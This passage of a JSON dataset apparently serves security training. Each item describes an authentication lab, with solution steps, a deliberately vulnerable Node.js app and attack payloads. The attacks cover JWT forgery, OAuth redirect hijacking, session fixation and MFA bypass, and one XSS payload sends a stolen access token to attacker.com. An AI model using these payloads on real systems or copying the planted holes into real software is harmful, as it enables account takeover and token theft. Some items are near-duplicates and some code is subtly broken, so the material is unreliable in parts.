      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
    "Lab Description": "The single-page application implements OAuth 2.0 with implicit flow but exposes access tokens in browser history due to improper callback handling. The application stores OAuth tokens in URL fragments. To solve: Retrieve victim's access token from browser history and access their profile data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP to identify token leakage points",
      "Craft malicious page that forces victim to initiate OAuth flow",
      "Exploit history.pushState to capture token from redirect URL",
      "Extract access_token parameter from simulated browser history",
      "Use stolen token in API requests to /user/profile endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const token = req.query.access_token;\n  res.redirect(`/welcome#token=${token}`);\n});\n\napp.get('/user/profile', (req, res) => {\n  const token = req.headers.authorization;\n  if (token === 'Bearer stolen_token') {\n    return res.json({email: 'victim@example.com'});\n  }\n  res.status(401).send('Unauthorized');\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>history.replaceState({},'','/malicious#access_token=stolen_token')</script>",
      "http://victim.com/oauth/callback?access_token=stolen_token"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation",
    "Lab Description": "The GraphQL API allows session fixation by accepting arbitrary session identifiers through the createSession mutation. The application doesn't regenerate session IDs after authentication. To solve: Fixate a session ID and trick the victim into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send introspection query to discover available mutations",
      "Use createSession mutation to generate predictable session ID",
      "Force victim browser to use this session via XSS or link injection",
      "Wait for victim to authenticate with fixated session",
      "Access victim account using the known session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Mutation {\n    createSession(id: String): Session\n  }\n  type Session {\n    id: String\n  }\n`;\n\nconst resolvers = {\n  Mutation: {\n    createSession: (_, { id }) => {\n      return { id: id || Math.random().toString(36).substr(2, 9) };\n    }\n  }\n};\n\nconst server = new ApolloServer({ typeDefs, resolvers });",
    "payloads": [
      "mutation { createSession(id: \"fixed123\") { id } }",
      "POST /graphql {\"query\":\"mutation($id:String!){createSession(id:$id){id}}\",\"variables\":{\"id\":\"attacker_controlled\"}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation in SOAP service",
    "Lab Description": "The SOAP-based authentication service implements MFA but fails to validate the state parameter between steps. The application trusts client-provided state values after MFA verification. To solve: Bypass MFA by manipulating state parameters in the authentication flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture initial SOAP auth request using Burp Suite",
      "Note the state parameter in the MFA initiation response",
      "Intercept MFA verification request and modify state to match first step",
      "Replay modified request before token expiration",
      "Access protected resource with obtained session token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({type: '*/xml'}));\n\nlet states = {};\n\napp.post('/soap/auth', (req, res) => {\n  const state = Math.random().toString(36).substr(2, 12);\n  states[state] = { verified: false };\n  res.type('application/xml');\n  res.send(`<AuthResponse><State>${state}</State></AuthResponse>`);\n});\n\napp.post('/soap/verify', (req, res) => {\n  const state = req.body.match(/<State>(.*?)<\\/State>/)[1];\n  states[state].verified = true;\n  res.type('application/xml');\n  res.send(`<VerifyResponse><Token>valid_token</Token></VerifyResponse>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<Envelope><Body><Verify><State>attacker_controlled</State><Code>123456</Code></Verify></Body></Envelope>",
      "<Envelope><Body><Auth><Username>admin</Username></Auth></Body></Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The microservice architecture uses JWT with kid header pointing to local files for key verification. The application fails to sanitize kid header values, allowing path traversal. To solve: Forge admin JWT by loading arbitrary local files as verification keys.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze kid header in JWT Editor",
      "Modify kid header to point to /dev/null or known static files (like /etc/passwd)",
      "Craft new token with alg:HS256 and kid:/var/www/keys/static_key.pub",
      "Sign token with simple key (like 'secret') and verify error responses",
      "Access /admin/api endpoint with forged token to retrieve flag"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/admin/api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  try {\n    const key = fs.readFileSync(decoded.header.kid);\n    jwt.verify(token, key);\n    res.json({flag: process.env.FLAG});\n  } catch (e) {\n    res.status(403).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.dBj6Je1Z3X3oI8Dtn0lt31kYd5pJZIAqZQZ3l2VnlIQ",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii92YXIvd3d3L2tleXMvc3RhdGljX2tleS5wdWIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.1HtH7lJZ4X3oI8Dtn0lt31kYd5pJZIAqZQZ3l2VnlIQ"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via insecure state validation",
    "Lab Description": "The OAuth implementation in the React frontend fails to properly validate state parameters during callback. The application trusts client-side state verification, allowing token swapping. To solve: Intercept OAuth flow and replace victim's auth code with your own while maintaining valid state.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow in OWASP ZAP while intercepting requests",
      "Capture state parameter and authorization code from callback URL",
      "Modify state parameter in Postman to match victim's session",
      "Swap authorization code while preserving modified state",
      "Exchange stolen code for access token at /oauth/token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet oauthStates = {};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state } = req.query;\n  if (oauthStates[state]) {\n    res.cookie('auth', code);\n    res.redirect('/profile');\n  } else {\n    res.status(400).send('Invalid state');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  res.json({access_token: 'stolen_token'});\n});\n\napp.listen(3000);",
    "payloads": [
      "http://target.com/oauth/callback?code=STOLEN_CODE&state=ATTACKER_STATE",
      "POST /oauth/token {\"code\":\"victim_code\"}"
    ]
  },
  {
    "Lab scenario": "Session token leakage via GraphQL verbose errors",
    "Lab Description": "The GraphQL endpoint leaks session tokens through verbose error messages when malformed queries are submitted. The application's debug mode remains enabled in production. To solve: Extract valid session tokens from error responses and hijack user sessions.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send malformed GraphQL queries using Postman to trigger errors",
      "Analyze error responses for leaked session information",
      "Identify pattern in session token generation",
      "Extract valid tokens from error stack traces",
      "Use stolen tokens in Authorization header to access /userProfile"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Query {\n    getUser: User\n  }\n  type User {\n    id: ID\n    name: String\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    getUser: (_, __, context) => {\n      if (!context.session) throw new Error('Invalid session: '+context.sessionToken);\n      return { id: 1, name: 'Admin' };\n    }\n  }\n};\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  debug: true,\n  formatError: (err) => {\n    return { message: err.message, stack: err.stack };\n  }\n});",
    "payloads": [
      "query { invalidField }\n# Returns error with session token",
      "mutation { __typename }"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in REST API",
    "Lab Description": "The MFA verification endpoint suffers from a race condition where the first valid code disables verification for subsequent requests. The application fails to implement proper transaction locking. To solve: Send parallel requests with valid and invalid codes to bypass MFA protection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture MFA verification request in Burp Suite",
      "Send multiple parallel requests using Turbo Intruder",
      "Mix valid and invalid codes in payloads",
      "Identify successful bypass when one valid code authenticates all requests",
      "Access restricted /transfer endpoint with stolen session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  if (mfaCodes[user] === code) {\n    delete mfaCodes[user];\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.post('/transfer', (req, res) => {\n  if (!req.headers.authorization) {\n    res.status(401).send('Unauthorized');\n  } else {\n    res.send('Transfer complete');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa [{\"user\":\"victim\",\"code\":\"123456\"},{\"user\":\"victim\",\"code\":\"111111\"}]",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}\nPOST /verify-mfa {\"user\":\"victim\",\"code\":\"INVALID_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT signature stripping via header injection in REST API",
    "Lab Description": "The API endpoint /admin/panel uses JWT authentication but fails to validate signature when custom headers are injected. The application processes unsigned tokens if x-algorithm header is present. To solve: Gain admin access by stripping JWT signature while maintaining valid payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT request in Burp Suite and add x-algorithm: none header",
      "Remove JWT signature section (content after second dot) while keeping header and payload",
      "Modify payload role to 'admin' and send to /admin/panel endpoint",
      "Verify successful bypass by checking HTTP 200 response",
      "Access restricted admin functions at /admin/panel/dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin/panel', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const options = {};\n  if (req.headers['x-algorithm']) {\n    options.algorithms = [req.headers['x-algorithm']];\n  }\n  try {\n    const decoded = jwt.verify(token, 'secret_key', options);\n    if (decoded.role === 'admin') {\n      res.json({access: 'granted'});\n    }\n  } catch (e) {\n    res.status(403).json({error: 'Forbidden'});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.ignored_signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via insecure redirect_uri validation",
    "Lab Description": "The OAuth implementation fails to properly validate redirect_uri parameters, allowing tokens to be leaked to attacker-controlled domains. The application doesn't verify exact match of registered callback URLs. To solve: Steal authorization code by modifying redirect_uri to point to malicious server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow in OWASP ZAP and intercept authorization request",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Let victim complete authentication flow",
      "Capture authorization code in attacker server logs",
      "Exchange code for access token at /oauth/token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'secret123',\n    redirectUris: ['https://*.example.com/callback']\n  }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const client = clients[client_id];\n  \n  if (client && redirect_uri.includes('example.com')) {\n    const code = 'random_code';\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid request');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "http://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com/callback",
      "http://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://subdomain.attacker.example.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint over websockets accepts arbitrary session IDs during connection initialization. The application doesn't regenerate session IDs after authentication. To solve: Fixate session ID through websocket connection and hijack authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish websocket connection to /graphql with custom session_id parameter",
      "Capture connection initialization frame in Burp Suite",
      "Modify session_id to predictable value and reconnect",
      "Trick victim into authenticating with fixated session ID",
      "Access privileged data through subscription queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Subscription {\n    secretData: String\n  }\n`;\n\nconst resolvers = {\n  Subscription: {\n    secretData: {\n      subscribe: (_, __, { sessionId }) => {\n        if (authenticatedSessions[sessionId]) {\n          return pubSub.asyncIterator('SECRET_DATA');\n        }\n      }\n    }\n  }\n};\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  subscriptions: {\n    onConnect: (params) => {\n      return { sessionId: params.sessionId || generateRandomId() };\n    }\n  }\n});",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"attacker_controlled\"}}",
      "{\"query\":\"subscription { secretData }\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-limited code reuse",
    "Lab Description": "The MFA implementation allows previously used codes to remain valid for short time windows after being consumed. The application fails to immediately invalidate used codes. To solve: Intercept valid MFA code and reuse it within the allowed time frame.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid MFA submission in Burp Suite",
      "Note timestamp of successful verification",
      "Resend same code within 30 second window",
      "Verify successful authentication with reused code",
      "Access protected /account endpoint with stolen session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst activeCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  \n  if (activeCodes[user] === code) {\n    setTimeout(() => delete activeCodes[user], 30000);\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/account', (req, res) => {\n  res.json({secret: 'STOLEN_DATA'});\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"PREVIOUSLY_USED_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via exposed public key in REST API",
    "Lab Description": "The API exposes its public key at /jwks.json endpoint but fails to properly validate JWT algorithm. The application accepts RS256-signed tokens when configured for HS256. To solve: Forge admin token by signing with public key as HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Retrieve public key from /jwks.json using Postman",
      "Convert JWK to PEM format using online tools",
      "Craft JWT with alg:HS256 and admin claims in Burp Suite JWT Editor",
      "Sign token using public key as HMAC secret",
      "Send forged token to /admin endpoint to gain access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\n\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/jwks.json'\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  if (decoded.header.alg === 'HS256') {\n    jwt.verify(token, getKey, {algorithms: ['HS256']}, (err, payload) => {\n      if (payload.role === 'admin') {\n        res.json({flag: process.env.FLAG});\n      }\n    });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure PKCE implementation",
    "Lab Description": "The OAuth flow uses PKCE but fails to properly validate code_verifier. The application doesn't enforce code_challenge_method matching. To solve: Bypass PKCE protection by omitting code_verifier parameter during token exchange.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept authorization code flow in OWASP ZAP",
      "Capture authorization code from callback URL",
      "Send token request without code_verifier parameter",
      "Analyze response for access token leakage",
      "Use stolen token to access user resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst authCodes = {};\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  \n  if (authCodes[code]) {\n    res.json({\n      access_token: 'stolen_token',\n      token_type: 'Bearer'\n    });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /oauth/token {\"code\":\"STOLEN_CODE\",\"grant_type\":\"authorization_code\"}",
      "POST /oauth/token {\"code\":\"STOLEN_CODE\",\"client_id\":\"legit_client\"}"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 connection coalescing",
    "Lab Description": "The application assigns session IDs during HTTP/2 connection establishment. The server reuses session IDs for coalesced connections to same origin. To solve: Fixate session ID by forcing victim to reuse your connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/2 connection and note session ID in Burp Suite",
      "Craft malicious page that loads resources from target domain",
      "Trick victim into visiting malicious page",
      "Monitor for session ID reuse in server logs",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nconst sessions = {};\n\nserver.on('stream', (stream, headers) => {\n  const sessionId = stream.session.id.toString('hex');\n  \n  if (!sessions[sessionId]) {\n    sessions[sessionId] = {\n      sessionToken: require('crypto').randomBytes(16).toString('hex')\n    };\n  }\n  \n  stream.respond({\n    'content-type': 'text/html',\n    ':status': 200\n  });\n  \n  stream.end(`<html>Your session: ${sessions[sessionId].sessionToken}</html>`);\n});\n\nserver.listen(443);",
    "payloads": [
      "<script src='https://victim.com/resource'></script>",
      "<link rel='stylesheet' href='https://victim.com/styles.css'>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter tampering in SOAP API",
    "Lab Description": "The SOAP-based MFA verification trusts client-provided state parameters. The application doesn't validate state between authentication steps. To solve: Modify state parameter to bypass MFA after initial authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture SOAP MFA initiation request in Burp Suite",
      "Note state parameter value",
      "Intercept MFA verification request",
      "Modify state to match initial request value",
      "Submit request to bypass MFA protection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({type: '*/xml'}));\n\nlet mfaStates = {};\n\napp.post('/soap/mfa', (req, res) => {\n  const state = req.body.match(/<state>(.*?)<\\/state>/)[1];\n  \n  if (mfaStates[state]) {\n    res.type('application/xml');\n    res.send('<Verified>true</Verified>');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "<Envelope><Body><Verify><state>ATTACKER_CONTROLLED</state></Verify></Body></Envelope>",
      "<Envelope><Body><Initiate><state>ATTACKER_CONTROLLED</state></Initiate></Body></Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key confusion in microservice architecture",
    "Lab Description": "The microservice authentication gateway accepts both HS256 and RS256 tokens but fails to properly validate key material. The application exposes public keys via /.well-known/jwks.json endpoint. To solve: Forge admin token by signing with public key as HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Retrieve public key from /.well-known/jwks.json using Postman",
      "Convert JWK to PEM format using online tools",
      "Craft JWT with alg:HS256 and admin:true claim using Burp Suite JWT Editor",
      "Sign token using public key as HMAC secret",
      "Send forged token to /admin-api endpoint to gain privileged access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\n\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/.well-known/jwks.json'\n});\n\napp.get('/admin-api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  const getKey = (header, callback) => {\n    if (header.alg === 'HS256') {\n      return callback(null, client.getSigningKey());\n    }\n    client.getSigningKey(header.kid, (err, key) => {\n      callback(err, key.publicKey || key.rsaPublicKey);\n    });\n  };\n  \n  jwt.verify(token, getKey, {algorithms: ['RS256', 'HS256']}, (err, payload) => {\n    if (payload.admin) {\n      res.json({secret: process.env.ADMIN_SECRET});\n    }\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.SIGNED_WITH_PUBLIC_KEY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMzQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via open redirect in mobile app deep linking",
    "Lab Description": "The mobile app's OAuth implementation accepts arbitrary redirect URIs in the deep link handler. The application fails to validate redirect_uri against allowlist when processing authorization codes. To solve: Steal authorization code by intercepting deep link with attacker-controlled redirect URI.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth initiation request in Burp Suite",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Capture authorization code in server logs",
      "Exchange code for access token at /oauth/token endpoint",
      "Use stolen token to access user resources via API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  \n  if (client_id === 'mobile_app') {\n    const code = generateAuthCode();\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid client');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  res.json({access_token: 'stolen_token'});\n});\n\napp.listen(3000);",
    "payloads": [
      "myapp://oauth?redirect_uri=https://attacker.com/callback",
      "https://victim.com/oauth/authorize?client_id=mobile_app&redirect_uri=https://attacker.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket connection ID reuse",
    "Lab Description": "The real-time application assigns session tokens during WebSocket connection establishment. The server reuses session IDs for reconnecting clients with same connection ID. To solve: Fixate session ID by forcing victim to reuse your WebSocket connection parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebSocket connection and note connection parameters",
      "Craft malicious page that forces victim to reuse connection ID",
      "Intercept victim authentication over WebSocket",
      "Hijack authenticated session using fixated connection ID",
      "Access privileged real-time data streams"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 8080 });\n\nconst sessions = {};\n\nwss.on('connection', (ws, req) => {\n  const connectionId = req.headers['sec-websocket-key'];\n  \n  if (!sessions[connectionId]) {\n    sessions[connectionId] = {\n      token: null,\n      authenticated: false\n    };\n  }\n  \n  ws.on('message', (message) => {\n    const data = JSON.parse(message);\n    \n    if (data.type === 'login') {\n      sessions[connectionId].token = data.token;\n      sessions[connectionId].authenticated = true;\n    }\n    \n    if (sessions[connectionId].authenticated) {\n      ws.send(JSON.stringify({secretData: 'VALUE'}));\n    }\n  });\n});",
    "payloads": [
      "{\"type\":\"login\",\"token\":\"VICTIM_TOKEN\"}",
      "{\"type\":\"request\",\"data\":\"SECRET\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-of-check to time-of-use race condition",
    "Lab Description": "The MFA verification endpoint has a race window between code validation and session marking. The application doesn't use atomic operations for MFA state transitions. To solve: Send parallel requests to bypass MFA by exploiting the race condition.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid MFA code submission in Burp Suite",
      "Send 20 parallel requests with same valid code using Turbo Intruder",
      "Identify successful bypass when one request authenticates session",
      "Hijack authenticated session cookie",
      "Access protected admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst mfaCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  \n  if (mfaCodes[user] === code) {\n    setTimeout(() => {\n      mfaCodes[user] = null;\n      res.json({verified: true});\n    }, 100);\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/admin', (req, res) => {\n  res.json({flag: process.env.FLAG});\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}\nPOST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via header injection in API gateway",
    "Lab Description": "The API gateway validates JWT tokens but fails to properly sanitize header values. The application processes unsigned tokens when x-verify-algorithm header is present. To solve: Gain admin access by stripping JWT signature while injecting custom verification header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT request in Burp Suite and add x-verify-algorithm: none header",
      "Remove JWT signature section while keeping header and payload",
      "Modify payload role to 'admin' and remove original signature",
      "Send modified token to /admin-api endpoint with custom header",
      "Verify access to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin-api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const options = {};\n  \n  if (req.headers['x-verify-algorithm']) {\n    options.algorithms = [req.headers['x-verify-algorithm']];\n  }\n  \n  try {\n    const decoded = jwt.verify(token, 'secret_key', options);\n    if (decoded.role === 'admin') {\n      res.json({access: 'granted'});\n    }\n  } catch (e) {\n    res.status(403).json({error: 'Forbidden'});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
    "Lab Description": "The single-page application implements OAuth with overly permissive CORS headers. The API endpoints allow arbitrary origins and include credentials in responses. To solve: Retrieve access token by making cross-origin requests from malicious site.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP to identify token endpoints",
      "Craft malicious HTML page making cross-origin requests to /oauth/token",
      "Capture access token in response using attacker server",
      "Use stolen token to access /user/profile endpoint",
      "Extract sensitive user data from API responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', req.headers.origin);\n  res.header('Access-Control-Allow-Credentials', 'true');\n  next();\n});\n\napp.get('/oauth/token', (req, res) => {\n  res.json({access_token: 'stolen_token'});\n});\n\napp.get('/user/profile', (req, res) => {\n  res.json({email: 'victim@example.com'});\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>fetch('https://victim.com/oauth/token').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+d.access_token))</script>",
      "fetch('https://victim.com/user/profile', {credentials: 'include'})"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 connection coalescing",
    "Lab Description": "The application assigns session IDs during HTTP/2 connection establishment. The server reuses session IDs for coalesced connections to same origin. To solve: Fixate session ID by forcing victim to reuse your connection parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/2 connection and note session ID in Burp Suite",
      "Craft malicious page loading resources from target domain",
      "Trick victim into visiting page to reuse connection",
      "Monitor for session ID reuse in server logs",
      "Hijack authenticated session using fixated ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nconst sessions = {};\n\nserver.on('stream', (stream, headers) => {\n  const sessionId = stream.session.id.toString('hex');\n  \n  if (!sessions[sessionId]) {\n    sessions[sessionId] = {\n      authToken: null\n    };\n  }\n  \n  if (headers[':path'] === '/login') {\n    sessions[sessionId].authToken = 'VALID_TOKEN';\n  }\n  \n  stream.respond({\n    'content-type': 'text/html',\n    ':status': 200\n  });\n  \n  stream.end(`Token: ${sessions[sessionId].authToken}`);\n});\n\nserver.listen(443);",
    "payloads": [
      "<script src='https://victim.com/resource'></script>",
      "<link rel='stylesheet' href='https://victim.com/style.css'>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation in REST API",
    "Lab Description": "The MFA verification endpoint trusts client-provided state parameters. The application doesn't validate state between authentication steps. To solve: Bypass MFA by modifying state parameter to match initial request value.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request in Burp Suite",
      "Note state parameter value from initial request",
      "Intercept MFA verification request",
      "Modify state parameter to match initial value",
      "Submit request to bypass MFA protection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaStates = {};\n\napp.post('/mfa/verify', (req, res) => {\n  const { state, code } = req.body;\n  \n  if (mfaStates[state]) {\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/account', (req, res) => {\n  res.json({balance: 10000});\n});\n\napp.listen(3000);",
    "payloads": [
